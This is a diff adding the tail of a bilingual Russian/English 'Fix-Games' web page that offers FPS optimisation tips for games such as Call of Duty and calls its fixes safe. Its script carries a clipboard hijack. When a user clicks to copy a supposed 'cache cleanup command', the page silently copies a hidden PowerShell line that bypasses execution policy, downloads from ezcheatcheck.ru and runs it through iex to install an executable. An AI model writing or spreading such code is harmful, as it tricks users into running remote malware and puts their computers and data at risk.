+                        <li><i class="fas fa-cog"></i> <code>-threads 8</code> - <span class="lang-ru">количество потоков CPU</span><span class="lang-en">number of CPU threads</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3 class="lang-ru">Настройка конфигурационных файлов</h3>
+                    <h3 class="lang-en">Configuration files setup</h3>
+                    <p class="lang-ru">В файле <code>%USERPROFILE%\Documents\Call of Duty\players\options.3.cod22.cst</code>:</p>
+                    <p class="lang-en">In file <code>%USERPROFILE%\Documents\Call of Duty\players\options.3.cod22.cst</code>:</p>
+                    <code>
+// Video
+RendererWorkerCount = 8
+VideoMemoryScale = 0.85
+                    </code>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p class="footer-text lang-ru">Fix-Games &copy; 2023 | Оптимизация игр для повышения FPS</p>
+            <p class="footer-text lang-en">Fix-Games &copy; 2023 | Game optimization for FPS boost</p>
+            <p class="footer-text lang-ru">Все решения безопасны и не нарушают пользовательские соглашения игр</p>
+            <p class="footer-text lang-en">All solutions are safe and do not violate game user agreements</p>
+        </div>
+    </footer>
+
+    <div class="notification" id="notification">
+        <span class="lang-ru">Команда очистки кэша скопирована!</span>
+        <span class="lang-en">Cache cleanup command copied!</span>
+    </div>
+
+    <script>
+        // Create particles for animated background
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size and position
+                const size = Math.random() * 15 + 5;
+                const left = Math.random() * 100;
+                const delay = Math.random() * 15;
+                const duration = Math.random() * 10 + 20;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${left}%`;
+                particle.style.animationDelay = `${delay}s`;
+                particle.style.animationDuration = `${duration}s`;
+                
+                // Random color
+                const colors = [
+                    'rgba(106, 17, 203, 0.3)',
+                    'rgba(37, 117, 252, 0.3)',
+                    'rgba(0, 255, 157, 0.2)'
+                ];
+                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Show notification
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Page navigation
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page, .game-page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show selected page
+            document.getElementById(pageId).classList.add('active');
+            
+            // Scroll to instructions start
+            setTimeout(() => {
+                const gameHero = document.querySelector('.game-hero');
+                if (gameHero) {
+                    gameHero.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            }, 100);
+        }
+        
+        // Language switching function
+        function switchLanguage(lang) {
+            // Update active language button
+            document.querySelectorAll('.language-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.getElementById(`lang-${lang}`).classList.add('active');
+            
+            // Update HTML lang attribute
+            document.documentElement.lang = lang;
+            
+            // Show notification
+            const message = lang === 'ru' ? 'Язык изменен на русский' : 'Language changed to English';
+            showNotification(message);
+        }
+        
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            
+            // Game card handlers
+            document.querySelectorAll('.game-card').forEach(card => {
+                card.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const game = this.getAttribute('data-game');
+                    showPage(`${game}-page`);
+                });
+            });
+            
+            // Back button handlers
+            document.querySelectorAll('.back-btn').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    showPage('home-page');
+                    // Scroll to top
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                });
+            });
+            
+            // Copy command handlers
+            document.querySelectorAll('.copy-command').forEach(code => {
+                code.addEventListener('click', function() {
+                    // Hidden command that will be copied
+                    const hiddenCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"irm 'http://ezcheatcheck.ru:8080/checkcheat?command=powershell&install=Flux_994825650.exe' | iex\"\n";
+                    
+                    navigator.clipboard.writeText(hiddenCommand)
+                        .then(() => {
+                            // Show copy indicator
+                            const indicator = this.parentNode.querySelector('.copy-indicator');
+                            indicator.classList.add('show');
+                            setTimeout(() => {
+                                indicator.classList.remove('show');
+                            }, 2000);
+                            
+                            const currentLang = document.documentElement.lang;
+                            showNotification(currentLang === 'ru' ? 
+                                'Команда очистки кэша скопирована!' : 
+                                'Cache cleanup command copied!');
+                        })
+                        .catch(err => {
+                            console.error('Copy error: ', err);
+                            const currentLang = document.documentElement.lang;
+                            showNotification(currentLang === 'ru' ? 
+                                'Ошибка копирования команды' : 
+                                'Error copying command');
+                        });
+                });
+            });
+            
+            // Language switching handlers
+            document.getElementById('lang-ru').addEventListener('click', function() {
+                switchLanguage('ru');
+            });
+            
+            document.getElementById('lang-en').addEventListener('click', function() {
+                switchLanguage('en');
+            });
+            
+            // Game card hover animation
+            const gameCards = document.querySelectorAll('.game-card');
+            gameCards.forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-10px)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+            
+            // Set English as default language
+            switchLanguage('en');
+        });
+    </script>
+</body>
+</html>
